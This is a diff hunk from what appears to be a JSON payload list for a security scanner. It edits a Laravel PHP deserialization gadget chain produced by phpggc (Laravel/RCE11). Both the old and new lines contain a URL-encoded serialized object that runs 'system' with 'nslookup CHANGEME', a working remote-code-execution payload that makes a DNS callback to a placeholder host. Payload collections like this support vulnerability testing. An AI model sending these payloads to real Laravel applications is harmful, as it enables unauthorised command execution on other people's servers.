@@ -111,7 +111,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.4.0 <= 9.1.8+ (11)",
     "gen_with": "./phpggc Laravel/RCE11 <function> <parameter>",
-    "payload": "O:37:\"Symfony\\Component\\Mime\\Part\\SMimePart\":3:{s:11:\"%00*%00_headers\"%3Ba:1:{s:8:\"dispatch\"%3Bs:6:\"system\"%3B}s:6:\"inhann\"%3BO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:5:\"event\"%3Bs:63:\"nslookup CHANGEME\"%3Bs:6:\"events\"%3BO:15:\"Faker\\Generator\":3:{s:12:\"%00*%00providers\"%3Ba:0:{}s:13:\"%00*%00formatters\"%3BN%3Bs:9:\"formatter\"%3Bs:8:\"dispatch\"%3B}}s:49:\"%00Symfony\\Component\\Mime\\Part\\AbstractPart%00headers\"%3BR:8%3B}"
+    "payload": "O:37:\"Symfony\\Component\\Mime\\Part\\SMimePart\":3:{s:11:\"%00*%00_headers\"%3Ba:1:{s:8:\"dispatch\"%3Bs:6:\"system\"%3B}s:6:\"inhann\"%3BO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:5:\"event\"%3Bs:63:\"nslookup CHANGEME\"%3Bs:6:\"events\"%3BO:15:\"Faker\\Generator\":1:{s:13:\"%00*%00formatters\"%3BN%3B}}s:49:\"%00Symfony\\Component\\Mime\\Part\\AbstractPart%00headers\"%3BR:7%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
